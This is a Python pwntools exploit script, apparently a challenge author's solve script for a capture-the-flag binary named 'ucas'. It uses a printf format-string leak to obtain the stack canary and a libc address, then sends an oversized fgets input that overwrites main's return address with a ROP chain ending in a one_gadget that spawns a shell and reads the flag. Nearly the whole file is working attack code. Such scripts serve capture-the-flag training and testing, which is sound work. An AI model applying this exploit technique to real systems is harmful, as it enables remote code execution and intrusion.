#!/usr/bin/env python3
# yes, this is vibecoded. the chall isn't. i just wanted to make sure it was
# solvable in the intended way -sportz

# ucas -- printf(name) format string leaks the canary and libc, then the
# oversized fgets() into q3 smashes main's return address into a one_gadget.
import os
from pwn import *

HERE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "handout")

context.binary = ELF(os.path.join(HERE, "ucas"), checksec=False)
libc = ELF(os.path.join(HERE, "libc.so.6"), checksec=False)

RET_OFF = (
    0x2B285  # main's return address inside __libc_start_call_main (leaked via %515$p)
)
XOR_R9 = 0x2A987  # xor r9d, r9d ; ret
ONE_GADGET = 0xEF0A6  # execve("/bin/sh", r9, r10)

if not args.LOCAL:
    r = remote(
        "determined_joliot.orb.local",
        1337,
    )
else:
    # pty, otherwise the unflushed printf() prompts never reach us
    r = process("./ucas", cwd=HERE, stdin=PTY, stdout=PTY)

# main's frame is rsp = rbp-0xfe0, so the canary at rbp-8 is %513$p
# and the saved return address at rbp+8 is %515$p.
r.sendlineafter(b"name: ", b"%513$p|%515$p")
r.recvuntil(b"welcome, ")
canary, ret = [int(x, 16) for x in r.recvline().strip().split(b"|")]
libc.address = ret - RET_OFF
log.success("canary: %#x", canary)
log.success("libc:   %#x", libc.address)
assert libc.address & 0xFFF == 0, "bad libc base"

# fgets(q3, 4000-chars) writes up to ~4000 bytes into char q3[1334] at rbp-0x540,
# so leave q1/q2 empty to keep the length budget and overwrite the saved rip.
# The one_gadget wants r9/r10 NULL-ish: zero r9 first, r10 is already fine.
chain = p64(libc.address + XOR_R9)
chain += p64(libc.address + ONE_GADGET)
chain += p64(0) * 32

payload = b"A" * (0x540 - 8) + p64(canary) + p64(0) + chain  # saved rbp = 0
assert b"\n" not in payload and len(payload) < 4000 - 2

r.sendlineafter(b"subject? ", b"")
r.sendlineafter(b"subject? ", b"")
r.sendlineafter(b"useful? ", payload)
r.recvuntil(b"clearing")

r.sendline(b"echo $(</flag)")  # no coreutils on the box, so no cat
r.interactive()
